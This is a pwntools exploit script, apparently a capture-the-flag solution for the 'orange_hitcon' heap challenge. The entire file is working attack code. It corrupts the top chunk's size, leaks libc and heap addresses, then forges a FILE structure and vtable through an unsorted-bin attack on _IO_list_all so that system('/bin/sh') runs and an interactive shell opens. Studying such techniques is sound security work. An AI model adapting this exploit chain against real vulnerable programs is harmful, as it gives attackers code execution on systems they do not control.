#coding:utf-8
from pwn import *

context.binary = './orange_hitcon'
#context.log_level = 'debug'

io = process('./orange_hitcon')
elf = ELF('./orange_hitcon')
libc = ELF('./orange_libc.so.6')

def build(Length,Name,Price,Choice):
    io.recvuntil('Your choice : ')
    io.sendline(str(1))
    io.recvuntil('name :')
    io.sendline(str(Length))
    io.recvuntil('Name :')
    io.send(Name)
    io.recvuntil('Orange:')
    io.sendline(str(Price))
    io.recvuntil('Color of Orange:')
    io.sendline(str(Choice))

def see():
    io.recvuntil('Your choice : ')
    io.sendline(str(2))

def upgrade(Length,Name,Price,Choice):
    io.recvuntil('Your choice : ')
    io.sendline(str(3))
    io.recvuntil('name :')
    io.sendline(str(Length))
    io.recvuntil('Name:')
    io.send(Name)
    io.recvuntil('Orange: ')
    io.sendline(str(Price))
    io.recvuntil('Color of Orange: ')
    io.sendline(str(Choice))

#OverWrite TopChunk
gdb.attach(io)
build(0x80,'AAAA',1,1)
upgrade(0x100,'B'*0x80+p64(0)+p64(0x21)+p32(0x1)+p32(0x1f)+2*p64(0)+p64(0xf31),2,2)

#trigger TopChunk->unsorted bin 
build(0x1000,'CCCC',3,3)

#leak libc_base 
build(0x400,'x',4,4)
see()
io.recvuntil('Name of house : ')
libc_base = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x3c5178
system_addr = libc_base+libc.symbols['system']
log.info('system_addr:'+hex(system_addr))
IO_list_all = libc_base+libc.symbols['_IO_list_all']
log.info('_IO_list_all:'+hex(IO_list_all))

#leak heap_base
upgrade(0x400,'x'*0x10,5,5)
see()
io.recvuntil('Name of house : ')
io.recvuntil('x'*0x10)
heap_base = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x130
log.info('heap_base:'+hex(heap_base))

# unsortedbin attack
# Fsop
vtable_addr = heap_base + 0x728-0xd0

payload = "D"*0x410
payload += p32(6+0x1f)+p32(6)+p64(0)

stream = "/bin/sh\x00"+p64(0x61)
# Stream
stream += p64(0xddaa)+p64(IO_list_all-0x10)
stream = stream.ljust(0xa0,"\x00")
stream += p64(heap_base+0x700-0xd0)
stream = stream.ljust(0xc0,"\x00")
stream += p64(1)

payload += stream
payload += p64(0)
payload += p64(0)
payload += p64(vtable_addr)
payload += p64(1)
payload += p64(2)
payload += p64(3) 
payload += p64(0)*3 # vtable
payload += p64(system_addr)
upgrade(0x800,payload,123,3)
#gdb.attach(io)

io.recvuntil('Your choice : ')
io.sendline(str(1))

io.interactive()

